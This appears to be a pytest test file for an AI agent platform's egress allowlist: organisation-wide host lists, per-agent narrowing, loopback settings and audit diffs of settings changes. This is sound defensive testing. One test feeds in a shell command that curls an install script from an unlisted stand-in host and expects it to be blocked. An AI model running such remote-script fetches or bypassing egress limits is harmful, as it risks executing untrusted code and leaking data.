"""Which hosts a tool may reach, and who decides (M38b-T10a, finding F11).

The organisation's list is the ceiling and an agent can only narrow it. A refusal is made
before anything is looked up or sent, and says where the list is changed. Whether this
machine's own addresses may be reached is a setting of the install, not a consequence of
the environment's name.
"""

from __future__ import annotations

import re
import uuid
from pathlib import Path
from typing import TYPE_CHECKING

from pydantic import SecretStr

from ar_common.settings import BaseServiceSettings, EnvName, get_settings, loopback_allowed
from ar_common.settings import set_settings as use_settings
from ar_domain.tools import general
from ar_domain.tools.general import dispatch_general, host_refusal
from ar_testing.demo import demo_store

if TYPE_CHECKING:
    import pytest

SOURCE = Path(__file__).resolve().parents[2] / "src" / "ar_domain"


def _tenant(store: object, hosts: list[str]) -> dict[str, object]:
    """A tenant whose tools may reach ``hosts``, and the caller's context for it."""
    tenant = uuid.uuid4()
    store.tenant_settings[tenant] = {"egress_allowlist": hosts}
    return {"_tenant_id": tenant, "_user_id": uuid.uuid4(), "_run_id": uuid.uuid4()}


def _agent(store: object, who: dict[str, object], tool: str, hosts: list[str]) -> dict[str, object]:
    """The same caller, through an agent that limits ``tool`` to ``hosts``."""
    version = uuid.uuid4()
    store.versions[version] = {
        "id": version,
        "definition": {
            "tools": [{"server": "general", "overrides": {tool: {"allow_hosts": hosts}}}]
        },
    }
    return {**who, "_agent_version_id": version}


def _never_resolve(monkeypatch: pytest.MonkeyPatch) -> list[str]:
    looked_up: list[str] = []

    def resolve(host: str) -> list[str]:
        looked_up.append(host)
        return ["93.184.216.34"]

    monkeypatch.setattr(general, "_resolve", resolve)
    return looked_up


def test_a_host_the_organisation_has_not_listed_is_refused_before_anything_is_sent(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    store = demo_store()
    who = _tenant(store, [])
    looked_up = _never_resolve(monkeypatch)
    sent: list[str] = []
    monkeypatch.setattr(general, "_send_fetch", lambda *a, **k: sent.append("request"))

    refused = dispatch_general(store, "fetch", {**who, "url": "https://example.com/page"})

    assert refused["is_error"] is True
    assert refused["code"] == "egress_denied"
    assert str(refused["text"]) == (
        "example.com is not on the list of hosts this organisation's tools may reach. "
        "An administrator adds it on the Policies screen, under Web access."
    )
    assert looked_up == [], "the name was looked up before the refusal"
    assert sent == [], "a request was made before the refusal"


def test_the_organisations_list_takes_a_host_or_a_wildcard() -> None:
    store = demo_store()
    who = _tenant(store, ["example.com", "*.acme.org"])
    assert host_refusal(store, who, "fetch", "example.com") is None
    assert host_refusal(store, who, "fetch", "EXAMPLE.com.") is None
    assert host_refusal(store, who, "fetch", "api.acme.org") is None
    assert host_refusal(store, who, "fetch", "acme.org") is None
    assert host_refusal(store, who, "fetch", "www.example.com") is not None
    assert host_refusal(store, who, "fetch", "notacme.org") is not None


def test_an_agent_narrows_the_list_for_a_tool() -> None:
    store = demo_store()
    who = _agent(store, _tenant(store, ["*.example.com"]), "fetch", ["api.example.com"])
    assert host_refusal(store, who, "fetch", "api.example.com") is None
    refused = host_refusal(store, who, "fetch", "www.example.com")
    assert refused == (
        "This agent limits the fetch tool to api.example.com, so it may not reach "
        "www.example.com. The agent's builder changes that list."
    )
    # Its limit is for that tool. Another tool has the organisation's whole list.
    assert host_refusal(store, who, "http", "www.example.com") is None


def test_an_agent_cannot_reach_a_host_the_organisation_has_not_listed() -> None:
    """An agent's own list used to be added to the organisation's, so anyone who could
    edit an agent could send data to any host."""
    store = demo_store()
    who = _agent(store, _tenant(store, ["example.com"]), "fetch", ["elsewhere.test"])
    refused = host_refusal(store, who, "fetch", "elsewhere.test")
    assert refused is not None
    assert "this organisation's tools may reach" in refused
    listed = dispatch_general(store, "fetch", {**who, "url": "https://elsewhere.test/x"})
    assert listed["code"] == "egress_denied"


def test_a_command_that_names_a_host_follows_the_same_list() -> None:
    store = demo_store()
    who = _agent(store, _tenant(store, ["example.com"]), "shell", ["example.com"])
    store.versions[who["_agent_version_id"]]["definition"]["tools"][0]["overrides"]["shell"][
        "network"
    ] = True
    refused = dispatch_general(
        store, "shell", {**who, "command": "curl -s https://elsewhere.test/install.sh"}
    )
    assert refused["code"] == "egress_denied"
    assert "elsewhere.test is not on the list of hosts" in str(refused["text"])


def test_loopback_is_the_installs_setting_whatever_the_environment_is_called(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    # The test run turns the setting on for itself. An install that says nothing has it off.
    monkeypatch.delenv("AR_EGRESS_ALLOW_LOOPBACK", raising=False)
    secret = SecretStr("unit-test-cursor-secret")
    for env in (EnvName.DEV, EnvName.CI, EnvName.PROD):
        plain = BaseServiceSettings(_env_file=None, env=env, cursor_secret=secret)
        assert loopback_allowed(plain) is False
        allowed = BaseServiceSettings(
            _env_file=None, env=env, egress_allow_loopback=True, cursor_secret=secret
        )
        assert loopback_allowed(allowed) is True


def test_a_listed_loopback_address_is_reached_only_when_the_install_allows_it() -> None:
    store = demo_store()
    who = _tenant(store, ["127.0.0.1"])
    previous = get_settings()
    try:
        use_settings(BaseServiceSettings(_env_file=None, egress_allow_loopback=False))
        refused = general._public_url(store, who, "http://127.0.0.1:9/x", tool="fetch")
        assert refused is not None
        assert refused["text"] == "127.0.0.1 is blocked by the egress deny list"
        use_settings(BaseServiceSettings(_env_file=None, egress_allow_loopback=True))
        assert general._public_url(store, who, "http://127.0.0.1:9/x", tool="fetch") is None
    finally:
        use_settings(previous)


def test_no_check_reads_the_environments_name_to_allow_loopback() -> None:
    reads = re.compile(r"AR_ENV.*\\b(dev|ci|test)\\b|allow_loopback\\s*=.*AR_ENV")
    found = [
        f"{path.relative_to(SOURCE)}:{number}"
        for path in sorted(SOURCE.rglob("*.py"))
        for number, line in enumerate(path.read_text(encoding="utf-8").splitlines(), 1)
        if reads.search(line)
    ]
    assert found == []


def test_the_audit_record_of_a_settings_change_says_what_changed() -> None:
    """It used to hold only the tenant's name, so nothing showed who opened a host."""
    from ar_domain.identity.limits import settings_diff

    before = {
        "egress_allowlist": [],
        "features": {"pii_redaction": True, "web_fetch": False},
        "privacy": {"notice_text_md": "", "redaction_entities": None},
    }
    after = {
        "egress_allowlist": ["example.com"],
        "features": {"pii_redaction": True, "web_fetch": True},
        "privacy": {"notice_text_md": "x" * 500, "redaction_entities": None},
    }
    assert settings_diff(before, after) == {
        "egress_allowlist": {"from": [], "to": ["example.com"]},
        "features.web_fetch": {"from": False, "to": True},
        "privacy.notice_text_md": {"from": "", "to": "x" * 200},
    }
    assert settings_diff(after, after) == {}
